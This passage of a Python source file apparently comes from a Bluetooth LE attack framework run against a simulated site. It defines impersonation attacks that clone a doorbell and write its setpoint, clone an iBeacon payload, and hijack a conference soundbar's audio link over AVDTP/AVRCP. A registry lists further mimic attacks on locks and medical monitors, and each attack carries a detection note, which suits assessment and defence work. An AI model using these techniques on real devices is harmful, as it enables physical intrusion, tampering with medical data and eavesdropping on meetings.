        identity = self.read_identity(ctx)
        return {"accepted": bool(identity), "technique": "read",
                "action": "vending telemetry identity read-back", "identity": identity,
                "writable_characteristics": len([row for row in device.gatt_rows()
                                                 if row.get("writable")]) if device else 0}


class BleDoorbellMimicAttack(_Peripheral):
    """Clone a doorbell camera and write its setpoint: ring it, or silence it."""

    name = "ble_doorbell_mimic"
    label = "BLE doorbell mimic (clone the doorbell, write its setpoint)"
    tool = "wifipilot bt.py (vendor ATT write) + blesim"
    role = "gatt"
    services = (0xFE30, 0x180A)
    finding_severity = "high"
    devices = ("doorbell", "camera_doorbell", "ip_camera", "alarm_panel")
    target = "Doorbell-1"
    detection = ("A ring with no motion event: the camera's own event log has a press that "
                 "no sensor corroborates.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        result = self.act(ctx, bytes([0x01, 0x01]), like="Setpoint")
        result["action"] = "doorbell setpoint write (ring)"
        result["process_value"] = self.read(ctx, like="Process Value").get("text", "")
        result["calibration"] = self.read(ctx, like="Calibration").get("text", "")
        return result


class BleIbeaconMimicAttack(_Peripheral):
    """Clone a location beacon and prove the scanner cannot tell the two payloads apart."""

    name = "ble_ibeacon_mimic"
    label = "BLE beacon mimic (clone a beacon's UUID, major and minor)"
    tool = "wifipilot bt.py (iBeacon payload) + blesim"
    role = "beacon"
    services = ()
    company_id = 0x004C
    finding_severity = "high"
    devices = ("ble_beacon", "ble_sensor", "gateway_hub", "badge_reader")
    detection = ("Two beacons with one identity on the floor plan: the asset tracking "
                 "platform shows a tag in two places at once, and neither is wrong.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        uid = "5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a"
        ad_type, payload = bt.ibeacon(uid, major=1, minor=7, tx_power=-59)
        advertised = bt.adv_payload(bt.ad_flags(le_general=True), (ad_type, payload))
        pdu = bt.adv_pdu(0x00, self.identity(ctx)[1] or "d0:00:00:00:00:01", advertised)
        parsed = bt.parse_adv_pdu(pdu)
        structures = parsed.get("ad") or []
        beacon = next((entry for entry in structures if entry.get("type") == 0xFF), {})
        # the payload is read back with the decoder a scanner would use, so the report
        # proves the clone's own advertisement carries the UUID it copied
        read_back = bt.parse_ibeacon(beacon) or {}
        return {"accepted": bool(beacon), "technique": "advertising",
                "action": "beacon payload clone (UUID, major, minor)",
                "uuid": uid, "major": 1, "minor": 7,
                "company_id": beacon.get("company"), "company": beacon.get("company_name", ""),
                "payload_bytes": len(payload), "advertised_bytes": len(advertised),
                "structures": [entry.get("kind") for entry in structures],
                "read_back": read_back,
                "device_payload": getattr(device, "beacon", "")}


class BleSoundbarMimicAttack(_Peripheral):
    """Clone a conference soundbar and take the audio link the room's phone opens."""

    name = "ble_soundbar_mimic"
    label = "BLE soundbar mimic (clone the soundbar, take the audio link)"
    tool = "wifipilot bt.py (AVDTP/AVRCP over L2CAP) + blesim"
    role = "audio"
    peer = "WF-SPEAKER"
    services = (0x110B, 0x110E)
    finding_severity = "high"
    devices = ("speaker", "smart_speaker", "bt_headset", "video_conference")
    detection = ("An A2DP configuration from a device the site does not own: the room's "
                 "phone shows a second soundbar with the same name and an audio link it "
                 "did not open.")

    def capability(self, ctx: AttackContext, device: Any) -> Dict[str, Any]:
        avdtp: List[Dict[str, Any]] = []
        avrcp: List[Dict[str, Any]] = []
        refused = 0
        hosts = [entry for entry in self.floor().devices
                 if getattr(entry, "bond_peer", "") == self.peer]
        for host in hosts:
            link = self.floor().link_for(host.address, "audio")
            sock = blesim.controller_socket(None, address=host.address, role="audio")
            if not link or not sock:
                continue
            for command in (bt.avdtp_discover(), bt.avdtp_get_capabilities(1),
                            bt.avdtp_set_configuration(1), bt.avdtp_simple(0x07, 1)):
                answer, _parsed = l2cap_exchange(sock, link, 0x0019, command)
                parsed = bt.parse_avdtp(command)
                avdtp.append({"host": host.name or host.address,
                              "signal": parsed.get("signal_name", ""),
                              "sent": bool(answer), "answer_bytes": len(answer)})
            for frame in (bt.avctp_frame(bt.avrcp_register(0x0001)),
                          bt.avctp_frame(bt.avrcp_passthrough(0x44)),
                          bt.avctp_frame(bt.avrcp_set_absolute_volume(0x60))):
                answer, _parsed = l2cap_exchange(sock, link, 0x0017, frame)
                body = bt.parse_avctp(answer).get("payload") if answer else b""
                avrcp.append({"host": host.name or host.address,
                              "command": bt.parse_avrcp(frame).get("name", ""),
                              "sent": bool(answer),
                              "answer": bt.parse_avrcp(body, response=True) if body else {}})
            refused += int(getattr(link, "audio_refused", 0) or 0)
        accepted = [row for row in avdtp + avrcp if row.get("sent")]
        return {"accepted": bool(accepted), "technique": "l2cap",
                "action": f"audio link (AVDTP {len(avdtp)} signals, AVRCP {len(avrcp)})",
                "avdtp": avdtp, "avrcp": avrcp, "hosts": [host.name for host in hosts],
                "audio_refused": refused}


# --------------------------------------------------------------------------- #
# registry
# --------------------------------------------------------------------------- #

ATTACKS: List[type] = [
    BleMouseMimicAttack, BleComboDongleMimicAttack, BleLockMimicAttack,
    BleLockMeshMimicAttack, BleBulbMimicAttack, BleMeshLampMimicAttack,
    BlePlugMimicAttack, BleBandMimicAttack, BleThermostatMimicAttack,
    BleScaleMimicAttack, BleGlucoseMimicAttack, BlePressureMimicAttack,
    BleEcgMimicAttack, BleHeartRateMimicAttack, BleAirQualityMimicAttack,
    BleChargerMimicAttack, BleLabelPrinterMimicAttack, BleIrHubMimicAttack,
    BleUwbAnchorMimicAttack, BlePatientMonitorMimicAttack, BleVehicleTrackerMimicAttack,
    BleVendingMimicAttack, BleDoorbellMimicAttack, BleIbeaconMimicAttack,
    BleSoundbarMimicAttack,
]

NAMES: List[str] = [cls.name for cls in ATTACKS]

#: metadata for the registry: what the catalogue, the planner and the docs read
META: Dict[str, Dict[str, Any]] = {}
for _cls in ATTACKS:
    META[_cls.name] = {
        "category": getattr(_cls, "category", "rogue"),
        "noise": getattr(_cls, "noise", "moderate"),
        "impact": getattr(_cls, "impact", "loot"),
        "detection": getattr(_cls, "detection", "") or (
            "two peripherals with one address on the floor, and a capability that "
            "executed on a link the user did not start"),
        "domain": "bluetooth",
        "devices": list(getattr(_cls, "devices", ())),
        "port": 0, "protocol": "ble",
        "technique": "impersonation",
        "severity": getattr(_cls, "finding_severity", "high"),
    }

REGISTRY = [(cls.name, META[cls.name], cls) for cls in ATTACKS]
